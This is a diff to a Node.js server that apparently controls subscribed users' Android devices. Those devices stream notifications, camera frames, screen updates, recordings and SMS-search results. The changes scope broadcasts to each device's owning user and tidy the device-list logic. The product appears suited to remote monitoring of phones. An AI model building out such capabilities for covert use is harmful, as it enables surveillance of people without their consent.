@@ -1481,7 +1481,8 @@ async function processMessage(clientId, clientType, event, data) {
                      event === 'notification:entry'  || event === 'app:foreground'||
                      event === 'device:heartbeat'    || event === 'device:pong'   ||
                      event === 'command:response'    || event === 'screen:update' ||
-                     event === 'offline_recording:save' || event === 'camera:frame';
+                     event === 'offline_recording:save' || event === 'camera:frame' ||
+                     event === 'data:chunk';
     if (!highFreq) {
         log(clientType === 'android' ? 'TCP' : 'WS', `← [${clientId}] ${event}`);
     }
@@ -2045,7 +2046,12 @@ async function processMessage(clientId, clientType, event, data) {
         if (!commandId) return;
 
         const conn = tcpClients.get(clientId);
-        const deviceId = conn?.deviceId;
+        const pending = pendingCmds.get(commandId);
+        const deviceId = conn?.deviceId || pending?.deviceId;
+        if (pending?.deviceId && conn?.deviceId && pending.deviceId !== conn.deviceId) {
+            log('TCP', `Ignoring command response from the wrong device for ${commandId}`, 'warn');
+            return;
+        }
 
         // Android's sendResponse() JSON-stringifies the response object before putting it
         // into the TCP envelope, so rawResponse arrives as a string, not an object.
@@ -2063,7 +2069,6 @@ async function processMessage(clientId, clientType, event, data) {
         }
 
         // Push to dashboard SSE IMMEDIATELY — before any DB operations
-        const pending = pendingCmds.get(commandId);
         if (pending) {
             clearTimeout(pending.timer);
             pendingCmds.delete(commandId);
@@ -2100,13 +2105,11 @@ async function processMessage(clientId, clientType, event, data) {
                              response: finalResponse, error: error || null, success: !error && !superseded,
                              superseded,
                              timestamp: new Date() };
-            // Broadcast to all SSE clients so the result reaches the dashboard even if the
-            // SSE connection reconnected (and got a new sseClientId) while the command was in flight.
-            // This is safe for single-admin setups; in multi-user setups each client filters by deviceId.
-            broadcastDash('command:result', result);
+            // Route device data only to admins and the owning user's dashboard.
+            broadcastDeviceScoped('command:result', result);
 
             if (!superseded) {
-                broadcastDash('activity:log', {
+                broadcastDeviceScoped('activity:log', {
                     type: 'command_result', deviceId, command: pending.command,
                     commandId, success: !error, timestamp: new Date()
                 });
@@ -2159,9 +2162,13 @@ async function processMessage(clientId, clientType, event, data) {
                 _internalChunkCollectors.delete(data.commandId);
                 collector.resolve(data.error ? [] : collector.items);
             }
+        } else {
+            // Chunk payloads can contain user/device data. Keep the device ID
+            // in the envelope and restrict delivery to admins and that device's
+            // owning access ID instead of broadcasting to every dashboard.
+            broadcastDeviceScoped('data:chunk', { ...data, deviceId });
         }
 
-        broadcastDash('data:chunk', { ...data, deviceId });
         return;
     }
 
@@ -4106,7 +4113,7 @@ function supersedeOlderPendingCommands(deviceId, command, completedOrder) {
     for (const [cid, pending] of stale) {
         clearTimeout(pending.timer);
         pendingCmds.delete(cid);
-        broadcastDash('command:result', {
+        broadcastDeviceScoped('command:result', {
             commandId: cid,
             command: pending.command,
             deviceId: pending.deviceId,
@@ -4125,7 +4132,7 @@ function removePendingCommands(entries, reason) {
     for (const [cid, pending] of entries) {
         clearTimeout(pending.timer);
         pendingCmds.delete(cid);
-        broadcastDash('command:result', {
+        broadcastDeviceScoped('command:result', {
             commandId: cid,
             command: pending.command,
             deviceId: pending.deviceId,
@@ -4210,7 +4217,7 @@ app.post('/api/commands', requireUserOrAdmin, requireActiveSubscription, async (
         if (pendingCmds.has(commandId)) {
             pendingCmds.delete(commandId);
             // Broadcast timeout to all SSE clients — SSE may have reconnected with a new ID
-            broadcastDash('command:result', {
+            broadcastDeviceScoped('command:result', {
                 commandId, command, deviceId, success: false,
                 error: 'Command timed out', timestamp: new Date()
             });
@@ -4353,7 +4360,7 @@ async function syncSmsHuntsToDevice(deviceId, clearSchedules = false) {
             if (smsHuntLastFingerprint.get(deviceId) === fingerprint) {
                 smsHuntLastFingerprint.delete(deviceId);
             }
-        broadcastDash('command:result', {
+        broadcastDeviceScoped('command:result', {
             commandId,
             command: 'set_sms_hunts',
             deviceId,
@@ -5612,34 +5619,71 @@ app.get('*', (req, res) => {
 // DB HELPERS
 // ============================================
 async function getDeviceList(accessIdFilter) {
-    // Helper: override isOnline to match the live TCP socket map so the
-    // dashboard never shows a device as online when commands would fail.
-    const reconcile = (devices) => devices.map(d => {
-        const obj = d.toObject ? d.toObject() : { ...d };
-        obj.isOnline = deviceToTcp.has(obj.deviceId);
-        return obj;
-    });
-    // Apply per-client access-id scoping. Admins call this without a filter
-    // and get every device. Users call this with their own accessId and only
-    // see devices that registered with the same id.
-    const scope = (devices) => {
-        if (!accessIdFilter) return devices;
-        return devices.filter(d => (d.accessId || '') === accessIdFilter);
+    const toPlain = (device) => device?.toObject ? device.toObject() : { ...device };
+    const timestamp = (value) => {
+        const parsed = value ? new Date(value).getTime() : 0;
+        return Number.isFinite(parsed) ? parsed : 0;
+    };
+    const mergeDevice = (current, incoming) => {
+        const next = toPlain(incoming);
+        const nextInfo = Object.fromEntries(
+            Object.entries(next.deviceInfo || {}).filter(([, value]) => value !== undefined && value !== null && value !== '')
+        );
+        const merged = {
+            ...current,
+            ...Object.fromEntries(Object.entries(next).filter(([, value]) => value !== undefined)),
+            deviceInfo: { ...(current.deviceInfo || {}), ...nextInfo },
+        };
+        merged.accessId = next.accessId || current.accessId || '';
+        merged.deviceName = next.deviceName || current.deviceName || next.deviceId;
+        if (current.registeredAt) merged.registeredAt = current.registeredAt;
+        if (timestamp(current.lastSeen) > timestamp(next.lastSeen)) {
+            merged.lastSeen = current.lastSeen;
+        }
+        return merged;
+    };
+    const mergeLiveDevices = (storedDevices) => {
+        const devicesById = new Map();
+        for (const raw of storedDevices || []) {
+            const device = toPlain(raw);
+            if (!device.deviceId) continue;
+            const current = devicesById.get(device.deviceId);
+            devicesById.set(device.deviceId, current ? mergeDevice(current, device) : device);
+        }
+        // The live registry is authoritative for devices connected since the
+        // last successful database write. Merge it into the persisted snapshot
+        // so a stale/partial database list cannot hide an active device.
+        for (const device of inMemoryDevices.values()) {
+            if (!device?.deviceId) continue;
+            const current = devicesById.get(device.deviceId);
+            devicesById.set(device.deviceId, current ? mergeDevice(current, device) : toPlain(device));
+        }
+        for (const deviceId of deviceToTcp.keys()) {
+            if (!devicesById.has(deviceId)) {
+                devicesById.set(deviceId, { deviceId, deviceName: deviceId, accessId: '' });
+            }
+        }
+        return [...devicesById.values()]
+            .map(device => ({ ...device, isOnline: deviceToTcp.has(device.deviceId) }))
+            .filter(device => !accessIdFilter || (device.accessId || '') === accessIdFilter)
+            .sort((a, b) => timestamp(b.lastSeen) - timestamp(a.lastSeen));
     };
 
-    // Priority: MongoDB → Redis → in-memory
+    // Prefer persisted records but always merge the current in-memory registry.
     try {
         const dbDevices = await Device.find().sort({ lastSeen: -1 })
             .maxTimeMS(MONGO_OPERATION_TIMEOUT_MS)
             .lean()
             .exec();
-        if (dbDevices && dbDevices.length > 0) return scope(reconcile(dbDevices));
+        if (dbDevices && dbDevices.length > 0) return mergeLiveDevices(dbDevices);
     } catch (_) {}
     // Fallback: Redis
-    const redisDevices = await R.getAllDevices();
-    if (redisDevices.length > 0) return scope(reconcile(redisDevices.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen))));
+    try {
+        const redisDevices = await R.getAllDevices();
+        if (redisDevices.length > 0) return mergeLiveDevices(redisDevices);
+    } catch (_) {}
     // Final fallback: in-memory
-    return scope(reconcile(Array.from(inMemoryDevices.values())));
+    return mergeLiveDevices(Array.from(inMemoryDevices.values()));
 }
 
 // Broadcast device:list to every connected dashboard, scoped per recipient.
@@ -5647,29 +5691,37 @@ async function getDeviceList(accessIdFilter) {
 // accessId. Sending one filtered payload per client is a tiny cost compared
 // to the round-trip latency improvement of doing it server-side.
 let deviceListBroadcastInFlight = null;
+let deviceListBroadcastDirty = false;
 async function broadcastDeviceList() {
     if (sseClients.size === 0) return;
-    if (deviceListBroadcastInFlight) return deviceListBroadcastInFlight;
+    if (deviceListBroadcastInFlight) {
+        deviceListBroadcastDirty = true;
+        return deviceListBroadcastInFlight;
+    }
     deviceListBroadcastInFlight = (async () => {
-        const adminList = await getDeviceList();
-        const userListCache = new Map();
-        for (const [id, client] of sseClients) {
-            let list = adminList;
-            if (client.role === 'user') {
-                const aid = client.accessId || '';
-                if (!aid) { list = []; }
-                else if (userListCache.has(aid)) { list = userListCache.get(aid); }
-                else {
-                    list = adminList.filter(d => (d.accessId || '') === aid);
-                    userListCache.set(aid, list);
+        do {
+            deviceListBroadcastDirty = false;
+            const adminList = await getDeviceList();
+            const userListCache = new Map();
+            for (const [id, client] of sseClients) {
+                let list = adminList;
+                if (client.role === 'user') {
+                    const aid = client.accessId || '';
+                    if (!aid) { list = []; }
+                    else if (userListCache.has(aid)) { list = userListCache.get(aid); }
+                    else {
+                        list = adminList.filter(d => (d.accessId || '') === aid);
+                        userListCache.set(aid, list);
+                    }
                 }
+                sseSend(id, 'device:list', list);
             }
-            sseSend(id, 'device:list', list);
-        }
+        } while (deviceListBroadcastDirty && sseClients.size > 0);
     })().catch((error) => {
         log('SSE', `Device list broadcast failed: ${error.message}`, 'warn');
     }).finally(() => {
         deviceListBroadcastInFlight = null;
+        if (deviceListBroadcastDirty && sseClients.size > 0) void broadcastDeviceList();
     });
     return deviceListBroadcastInFlight;
 }
@@ -5692,6 +5744,12 @@ function broadcastDashScoped(event, data, accessId) {
             if (typeof client.res.flush === 'function') client.res.flush();
         } catch (_) {}
     }
+}
+
+function broadcastDeviceScoped(event, data) {
+    const deviceId = data?.deviceId;
+    const accessId = deviceId ? inMemoryDevices.get(deviceId)?.accessId || null : null;
+    broadcastDashScoped(event, data, accessId);
 }
 
 // ============================================
